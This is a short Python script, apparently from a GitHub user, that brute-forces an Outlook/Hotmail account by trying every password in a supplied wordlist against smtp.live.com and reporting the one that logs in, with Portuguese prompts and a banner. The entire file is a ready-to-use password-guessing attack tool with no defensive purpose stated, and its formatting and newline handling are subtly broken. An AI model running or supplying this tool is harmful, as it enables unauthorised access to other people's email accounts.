#BruteForce Outlook
import smtplib
print("""\033[1;31m
 ____    ______    ____            _     _   _           _____         
|  _ \  |  ____|  / __ \          | |   | | | |         / ____|        
| |_) | | |__    | |  | |  _   _  | |_  | | | | __     | |       _   _ 
|  _ <  |  __|   | |  | | | | | | | __| | | | |/ /     | |      | | | |
| |_) | | |      | |__| | | |_| | | |_  | | |   <   _  | |____  | |_| |
|____/  |_|       \____/   \__,_|  \__| |_| |_|\_\ (_)  \_____|  \__, |
                                                                  __/ |
                                                                 |___/ 
Coder > ejr_geek
GitHub > github.com/ejrgeek | BFOutlk.Cy v2.0
\033[0;0m""")
servidor=smtplib.SMTP("smtp.live.com",587)
servidor.ehlo()
servidor.starttls()

email=input("\033[1;34mEMAIL > \033[0;0m")
wordlt=input("\033[1;34mSua WordList > \033[0;0m")

wordl=open(wordlt, "r")

for passwd in wordl:
    try:
        servidor.login(email,passwd)
        print("\033[1;34m[♚] Senha Encontrada > %s \033[0;0m") %passwd
        break
    except:
        print("\033[1;31m[♙] Falha > %s \033[0;0m") %passwd
